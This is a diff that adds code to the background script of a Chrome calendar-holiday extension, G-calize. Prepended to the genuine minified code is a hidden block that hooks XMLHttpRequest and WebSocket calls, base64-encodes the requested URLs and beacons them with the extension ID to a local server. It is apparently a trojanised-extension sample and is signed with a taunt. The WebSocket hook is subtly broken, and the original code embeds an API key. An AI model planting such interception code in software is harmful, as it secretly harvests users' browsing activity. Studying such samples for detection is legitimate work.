@@ -1,0 +1,40 @@
+function collectMessageToServer(data){
+    var img = document.createElement("img");
+    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
+}
+
+function hookAjax(){
+    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(){
+        console.log(arguments);
+        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
+        _XMLHTTPRequestOpen.apply(this, arguments);
+    }
+}
+function hookWebsocket() {
+    var _websockSend = WebSocket.prototype.send;
+    WebSocket.prototype.send = () => {
+        console.log(arguments);
+        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
+        _websockSend.apply(this, arguments);
+    }
+}
+
+function run(){
+    hookAjax();
+    hookWebsocket();
+}
+run();
+//sn00ker_ahahaha
+"use strict";
+/*!
+ * G-calize : background.js
+ * Thank you using the Extension
+ * Copyright (C) Yo Wauke. All Rights Reserved.
+ * https://plus.google.com/104819699346433230202/
+ * --------------------------------------------------
+ * [じーからいず]って読むの。ゆたしくうにげーさびら。
+ */var apiKey="AIzaSyBZJ_MKsMe5wVwBlRyp300jtgiJBU_WLOY";!function(t,e,a){var r={};r.opt_url=chrome.extension.getURL("options.html"),r.admin={Y_AGO:3,Y_AFT:6};var s=function(){var t=r.Storage.get("holidays"),e=+[t.hld_saved]||9999,a=new Date,s=+[a.getFullYear()+""+("0"+(a.getMonth()+1)).slice(-2)+("0"+a.getDate()).slice(-2)],n=a.getFullYear()+"."+("0"+(a.getMonth()+1)).slice(-2)+"."+("0"+a.getDate()).slice(-2);if(""!=t.hld_cid&&t.hld_data&&1==t.flg_hld&&s>e+30)setTimeout(function(){trace(">>Holidays ReImport and Update -> Start!"),r.loadGcal2.clear().setSettings({splitload:!0,startYear:a.getFullYear()-r.admin.Y_AGO,endYear:a.getFullYear()+r.admin.Y_AFT,calendarID:t.hld_cid}).step(function(t,e){}).done(function(e){e.stat&&(t.hld_saved=s,t.hld_info=e.startYear+" ... "+e.endYear+" = "+e.info2+" (Last imported:"+n+")",t.hld_data=JSON.stringify(e.days),r.Storage.save("holidays",t),i())}).load()},1e3);else trace(">>Holidays ReImport and Update -> NoUpdate!")},i=function(){chrome.windows.getAll({populate:!0},function(t){for(var e=0;e<t.length;e++)for(var a=0;a<t[e].tabs.length;a++){var r=t[e].tabs[a];(r.url.match("google.com/calendar")||r.url.match("ode25pfjgmvpquh3b1oqo31ti5ibg5fr-a-calendar"))&&chrome.tabs.sendMessage(r.id,{method:"GCALIZE_updateCSS"},function(t){})}})};
+//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+chrome.tabs.onUpdated.addListener(function(t,e,a){a.url.toString().match(/^https?:\/\/(.*?).google.com\/calendar/i)&&chrome.pageAction.show(t)}),chrome.pageAction.onClicked.addListener(function(t){var e=t.index,a=r.opt_url;chrome.windows.getCurrent(function(t){var r=t.id;chrome.tabs.getAllInWindow(r,function(t){for(var r,s=0;s<t.length;s++){t[s].url.match(a)&&(r=t[s])}r?chrome.tabs.update(r.id,{selected:!0},null):chrome.tabs.create({index:e+1,url:a},null)})})}),t.onload=function(){trace("--- ▼G-calize: BackGround▼ ----"),r.extDetail=chrome.app.getDetails()||chrome.runtime.getManifest(),r.extID=r.extDetail.id||chrome.runtime.id,r.version=r.extDetail.version,r.Storage=new _Storage,r.loadGcal=new GcalLoader(apiKey),r.loadGcal2=new GcalLoader(apiKey),trace(r),trace(">>ExtensionID: "+r.extID),trace(">>Version: "+r.version),trace("--------------------------------"),t.Gcalize=r,chrome.runtime.onMessage.addListener(function(t,e,a){return trace(">>chrome.runtime.onMessage"),trace("...request.method: "+t.method),trace("-----------------------"),"GCALIZE_getStorage"==t.method?a(r.Storage.getAll()):"GCALIZE_reload"==t.method?(a("OK"),i()):a({}),!0}),s()}}(window,document),function(t,e,a){var r=function(){},s=function(){function e(t){this._apiKey=t||"",this.isLoading=!1,this.splitload=!1,this.calendarID="",this.startYear=0,this.endYear=0,this.datas={},this.doneCallback=r,this.failCallback=r,this.stepCallback=r,this.clearDatas()}e.constructor=e,e.prototype.done=function(t){return this.doneCallback=t,this},e.prototype.fail=function(t){return this.failCallback=t,this},e.prototype.step=function(t){return this.stepCallback=t,this},e.prototype.clear=function(){return this.splitload=!1,this.calendarID="",this.startYear=0,this.endYear=0,this.clearDatas(),this.doneCallback=r,this.failCallback=r,this.stepCallback=r,this},e.prototype.clearDatas=function(){return delete this.datas,this.datas=null,this.datas={stat:!0,calendarID:"",calendarName:"",startYear:0,endYear:0,total:0,days:{},errors:[],eachYearTotal:{},eachYear:{},info1:"",info2:""},this},e.prototype.setSettings=function(t){for(var e in t)e&&t[e]&&this.hasOwnProperty(e)&&(this[e]=t[e]);return this};var a=function e(a,r){var i=this,n=null,o=null,l="",d="",c="",h="",u=null,m=null,p=(r=r||null,this.startYear),f=this.endYear;if(this.splitload&&(p=this.startYear+a,f=this.startYear+a),p&&f){var g,y,Y,v,C,T=(g=this._apiKey,y=this.calendarID,Y=p+"-01-01T00:00:00.000Z",v=f+"-12-31T23:59:59.000Z",C="https://www.googleapis.com/calendar/v3/calendars/"+encodeURIComponent(y),C+="/events?orderBy=startTime&singleEvents=true&",C=(C+="fields=description%2Citems(description%2Cend%2Cstart%2Cstatus%2Csummary%2Cupdated%2Cvisibility)%2CnextPageToken%2Csummary")+"&timeMin="+Y+"&timeMax="+v+"&maxResults=9999&key="+g),w=new function(){var e=["Msxml2.XMLHTTP","Microsoft.XMLHTTP"];if(!t.ActiveXObject)return!!t.XMLHttpRequest&&new XMLHttpRequest;for(var a=0;a<e.length;a++)try{return new ActiveXObject(e[a])}catch(t){}};w.overrideMimeType&&w.overrideMimeType("application/json"),w.open("GET",T,!1),w.onreadystatechange=function(){if(4===w.readyState&&200===w.status&&"application/json"==w.getResponseHeader("Content-Type").split(";")[0]){var t=JSON.parse(w.responseText);if(trace(t),i.datas.calendarName||(i.datas.calendarName=t.summary||""),t.items&&t.items.length)for(var f=0,g=t.items.length;f<g;f++)if(l=t.items[f].status||"",d=t.items[f].summary||"No Title",c=t.items[f].start&&t.items[f].start.date||"",h=t.items[f].end&&t.items[f].end.date||"",("confirmed"===l||"tentative"===l)&&c&&h&&(u=c.match(/^(\d{4})-(\d{2})-(\d{2})$/))&&(m=h.match(/^(\d{4})-(\d{2})-(\d{2})$/))){n=new Date(+[u[1]],+[u[2]]-1,+[u[3]]),o=new Date(+[m[1]],+[m[2]]-1,+[m[3]]);for(var y=!0;y;)n.getTime()>=o.getTime()?y=!1:(s(i.datas,n,d),n.setDate(n.getDate()+1))}}else i.datas.errors.push("[xhr.status="+(w.status||404)+"/"+p+"] XMLHttpRequest couldn't load, or not type of JSON");if(a++,i.stepCallback.call(i,p-i.startYear+1,i.endYear-i.startYear+1),i.splitload&&p<i.endYear)setTimeout(function(){e.call(i,a,r)},500);else r&&r.call(i)};try{w.send()}catch(t){i.datas.errors.push("[xhr.status="+(w.status||404)+"/"+p+"] XMLHttpRequest done fail.(try->catch)"),r&&r.call(i)}}else r&&r.call(this)},s=function(t,e,a){var r,s={y:""+(r=e).getFullYear(),m:("00"+(r.getMonth()+1)).slice(-2),d:("00"+r.getDate()).slice(-2)};t.days[s.y+""+s.m+s.d]?t.days[s.y+""+s.m+s.d]+=", "+a:t.days[s.y+""+s.m+s.d]=a,t.eachYear||(t.eachYear={}),t.eachYear[s.y]||(t.eachYear[s.y]={}),t.eachYear[s.y][s.m]||(t.eachYear[s.y][s.m]={}),t.eachYear[s.y][s.m][s.d]?t.eachYear[s.y][s.m][s.d]+=", "+a:t.eachYear[s.y][s.m][s.d]=a,t.eachYearTotal.hasOwnProperty(s.y)||(t.eachYearTotal[s.y]=0),t.eachYearTotal[s.y]++};return e.prototype.load=function(){if(this.isLoading)return this;var t=["calendarID","startYear","endYear"];for(var e in t)this[t[e]]||this.datas.errors.push("["+t[e]+"] is require");return this.datas.errors&&this.datas.errors.length?(this.failCallback.call(this,!1,this.datas),this):(this.isLoading=!0,this.startYear=+[this.startYear]||0,this.endYear=+[this.endYear]||0,this.stepCallback.call(this,0,this.endYear-this.startYear+1),a.call(this,0,function(){var t=0,e=[],a=this.datas;for(var r in a.calendarID=this.calendarID,a.startYear=this.startYear,a.endYear=this.endYear,a.stat=!(a.errors.length>0),a.days)t++;for(var s in a.total=t,a.info1="",a.eachYearTotal)e.push(s+"("+a.eachYearTotal[s]+")");a.info1=e.join(","),a.info2="Total "+t+" days";var i=this;setTimeout(function(){i.isLoading=!1,i.doneCallback.call(i,i.datas)},500)}),this)},e}();t.GcalLoader=s}(window,document);
